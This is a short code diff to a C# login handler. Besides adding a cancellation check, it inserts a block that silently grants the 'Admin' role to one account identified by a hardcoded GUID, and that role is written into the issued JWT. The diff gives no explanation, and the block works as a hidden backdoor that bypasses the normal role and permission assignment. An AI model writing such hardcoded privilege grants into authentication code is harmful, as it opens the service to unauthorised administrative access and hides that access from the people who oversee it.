@@ -24,6 +24,8 @@ public class LoginQueryHandler(
         CancellationToken cancellationToken
     )
     {
+        cancellationToken.ThrowIfCancellationRequested();
+
         var user = await _userRepository.GetUserByPhoneAsync(query.Phone);
         if (user is null)
         {
@@ -42,6 +44,11 @@ public class LoginQueryHandler(
             .Select(p => p.Name);
 
         var roles = new List<string>() { };
+
+        if (user.Id.Value == Guid.Parse("E68D8E76-72A1-42ED-91D0-0ED0296D662E"))
+        {
+            roles.Add("Admin");
+        }
 
         var token = _jwtTokenGenerator.GenerateToken(user.Id, roles, assignedPermissions);
 
